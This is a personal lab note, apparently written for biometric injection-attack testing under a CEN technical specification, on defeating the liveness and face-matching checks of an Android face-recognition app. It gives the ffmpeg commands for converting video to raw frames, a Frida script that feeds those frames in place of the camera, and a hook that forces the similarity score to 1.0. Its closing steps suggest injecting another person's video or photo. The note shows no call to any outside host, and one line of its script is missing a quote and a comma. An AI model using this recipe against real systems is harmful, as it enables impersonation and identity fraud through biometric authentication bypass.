
> [! Tags]
> #Android #hooking #videoinjection #CEN18099



## Reference

1. yuv recording used by an Android-based device
2. [[CEN TS 18099-2024.pdf]]
3. [[Hooking Tuya localkey]]

## Steps

> 1. Reverse engineering on the APK by Jadx-GUI

2. Locate the key injection point.


> 	**Liveness**
> 	**SimilarityCalculation()**


3. Record the video by using OBS. 
>  **It could be the camera by Macbook camera. Remember change the .mov to .mp4 format.
>  It could be the movie or other recordings by OBS. Remember to change to .mp4 format.**


4. Video formatting convert by using ffmpeg

```

ffmpeg -i <mp4 video> -pix_fmt nv21 -f rawvideo <output.yuv>


# ensure the converted video works fine. Sometimes the video doesnot work.
ffplay -video_size 1280x720 -pixel_format nv21 -f rawvideo <.yuv video>
```

> Then adb push the video to the /data/local/tmp/

5.  Create the hooking scripts and inject the video
```
# create the fake frame

# be careful about the width/height
const CONFIG = {
	width: 1280,
	height: 720,
	yuvPath: "/data/local/tmp/test5.yuv
	forceRotation: 270 
};

var Frame = Java.use("io.fotoapparat.preview.Frame");
var Resolution = Java.use("io.fotoapparat.parameter.Resolution");
var File = Java.use("java.io.File");
var FileInputStream = Java.use("java.io.FileInputStream");

var f = File.$new(CONFIG.yuvPath);
var frameSize = CONFIG.width * CONFIG.height * 3 / 2;
var byteArr = Java.array('byte', new Array(frameSize).fill(0));
var fis = FileInputStream.$new(f);
fis.read(byteArr, 0, frameSize);
fis.close();

fakeFrame = Frame.$new(Resolution.$new(CONFIG.width, CONFIG.height), byteArr, CONFIG.forceRotation);
```

```
# hook the similarityCalculation and liveness

Java.classFactory.loader = loader;
var FaceSDK = Java.use(targetSDK);
var simOverloads = FaceSDK.similarityCalculation.overloads;
simOverloads.forEach(function (overload) {
	overload.implementation = function () {
		this.similarityCalculation.apply(this, arguments);
		console.log("[!] Similarity 拦截：强制返回 1.0");
		return 1.0;
	};
});


```


6. execute the hook script

```
frida-ps -Uai
# get the package name

frida -U -f com.kbyai.facerecognition -l youscripts.js
```

7. Inject your video or other person's video
8. Or use a photo or other personnel to cheat the camera

